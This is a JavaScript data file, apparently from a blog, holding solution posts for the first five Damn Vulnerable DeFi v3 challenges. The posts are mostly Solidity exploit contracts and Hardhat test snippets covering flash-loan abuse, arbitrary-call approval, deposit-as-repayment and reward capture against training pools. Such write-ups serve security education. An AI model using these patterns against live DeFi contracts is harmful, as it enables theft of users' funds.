export default {
    posts: [
        {
            id: "damn-vulnerable-defi-solutions-1-unstoppable",
            title: `Damn Vulnerable DeFi V3 Solutions: Unstoppable`,
            description: `Solution for the 1st Damn Vulnerable DeFi v3 challenge.`,
            date: "May 30, 2023",
            snippets: [
                `if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();`,
                `it("Exploit", async function () {
    await token.connect(player).transfer(vault.address, 1);
});`,
            ],
        },
        {
            id: "damn-vulnerable-defi-solutions-2-naive-receiver",
            title: `Damn Vulnerable DeFi V3 Solutions: Naive Receiver`,
            description: `Solution for the 2nd Damn Vulnerable DeFi v3 challenge.`,
            date: "June 1, 2023",
            snippets: [
                `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

interface INaiveReceiverLenderPool {
    function flashLoan(
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);
}

contract Exploit_NaiveReceiver {
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    function exploit(
        INaiveReceiverLenderPool pool,
        IERC3156FlashBorrower receiver
    ) public {
        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(receiver, ETH, 1 ether, "x0");
        }
    }
}`,
                `it("Exploit", async function () {
    const attacker = await (
        await ethers.getContractFactory("Exploit_NaiveReceiver", player)
    ).deploy();

    attacker.exploit(pool.address, receiver.address);
});`,
            ],
        },
        {
            id: "damn-vulnerable-defi-solutions-3-truster",
            title: `Damn Vulnerable DeFi V3 Solutions: Truster`,
            description: `Solution for the 3rd Damn Vulnerable DeFi v3 challenge.`,
            date: "June 2, 2023",
            snippets: [
                `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ITrusterLenderPool {
    function flashLoan(
        uint256 amount,
        address borrower,
        address target,
        bytes calldata data
    ) external returns (bool);
}

contract Exploit_Truster {
    function exploit(
        IERC20 token,
        ITrusterLenderPool pool,
        address receiver
    ) external {
        bytes memory payload = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            type(uint256).max
        );

        pool.flashLoan(0, receiver, address(token), payload);

        token.transferFrom(address(pool), receiver, 1_000_000 ether);
    }
}`,
                `it("Exploit", async function () {
    attacker = await (
        await ethers.getContractFactory("Exploit_Truster", player)
    ).deploy();

    await attacker.exploit(token.address, pool.address, player.address);
});`,
            ],
        },
        {
            id: "damn-vulnerable-defi-solutions-4-side-entrance",
            title: `Damn Vulnerable DeFi V3 Solutions: Side Entrance`,
            description: `Solution for the 4th Damn Vulnerable DeFi v3 challenge.`,
            date: "June 3, 2023",
            snippets: [
                `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISideEntranceLenderPool {
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256 amount) external;
}

contract Exploit_SideEntrance {
    ISideEntranceLenderPool public pool;

    constructor(ISideEntranceLenderPool _pool) {
        pool = _pool;
    }

    function exploit(address payable receiver) external {
        // pool.flashLoan() will make a call to 'execute()' function where we exploit the contract
        pool.flashLoan(1000 ether);
        // Withdraw the credited balance to this contract
        pool.withdraw();
        // ransfer the stolen funds to attacker's EOA
        receiver.transfer(address(this).balance);
    }

    // Called by SideEntranceLenderPool::flashLoan
    function execute() public payable {
        // Return the flash loan using 'deposit()' function in the pool contract.
        // Using 'deposit()' will credit this contract with the amount of
        // returned flash loan had been taken.
        pool.deposit{value: address(this).balance}();
    }

    // This is necessary for this contract to be able to receive ETH
    receive() external payable {}
}`,
                `it("Exploit", async function () {
    attacker = await (
        await ethers.getContractFactory("Exploit_SideEntrance", player)
    ).deploy(pool.address);

    await attacker.exploit(player.address);
});`,
            ],
        },
        {
            id: "damn-vulnerable-defi-solutions-5-the-rewarder",
            title: `Damn Vulnerable DeFi V3 Solutions: The Rewarder`,
            description: `Solution for the 5th Damn Vulnerable DeFi V3 challenge.`,
            date: "June 5, 2023",
            snippets: [
                `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ITheRewarderPool {
    function deposit(uint256 amount) external;

    function withdraw(uint256 amount) external;
}

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

contract Exploit_TheRewarder {
    address attackerEOA;
    IERC20 liquidityToken;
    IERC20 rewardToken;
    ITheRewarderPool rewardPool;
    IFlashLoanerPool flashLoanPool;

    constructor(
        address _attackerEOA,
        IERC20 _liquidityToken,
        IERC20 _rewardToken,
        ITheRewarderPool _rewardPool,
        IFlashLoanerPool _flashLoanPool
    ) {
        attackerEOA = _attackerEOA;
        liquidityToken = _liquidityToken;
        rewardToken = _rewardToken;
        rewardPool = _rewardPool;
        flashLoanPool = _flashLoanPool;
    }

    function exploit() public {
        uint256 amount = liquidityToken.balanceOf(address(flashLoanPool));
        flashLoanPool.flashLoan(amount);
    }

    //callback IFlashLoanerPool:flashLoan()
    function receiveFlashLoan(uint256 amount) public {
        liquidityToken.approve(address(rewardPool), amount);

        rewardPool.deposit(amount);
        rewardPool.withdraw(amount);

        uint256 stolenReward = rewardToken.balanceOf(address(this));
        require(stolenReward > 0, "Could not steal the funds.");
        rewardToken.transfer(attackerEOA, stolenReward);

        //return the flash loan
        liquidityToken.transfer(address(flashLoanPool), amount);
    }
}`,
                `it("Exploit", async function () {
    await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days

    attacker = await (
        await ethers.getContractFactory("Exploit_TheRewarder", player)
    ).deploy(
        player.address,
        liquidityToken.address,
        rewardToken.address,
        rewarderPool.address,
        flashLoanPool.address
    );

    await attacker.exploit();
});`,
            ],
        },
    ],
};
